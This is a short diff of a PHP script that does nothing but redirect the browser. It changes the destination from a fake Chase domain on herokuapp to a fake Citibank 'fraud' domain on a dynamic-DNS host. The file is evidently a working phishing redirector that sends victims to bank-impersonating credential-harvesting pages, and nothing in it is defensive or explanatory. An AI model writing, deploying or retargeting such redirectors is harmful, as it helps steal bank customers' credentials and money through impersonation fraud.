@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://www03-chaseonlinesec.herokuapp.com/"); 
+header("Location: https://citibank-fraudconn.myvnc.com/"); 
   
 exit; 
 ?> 
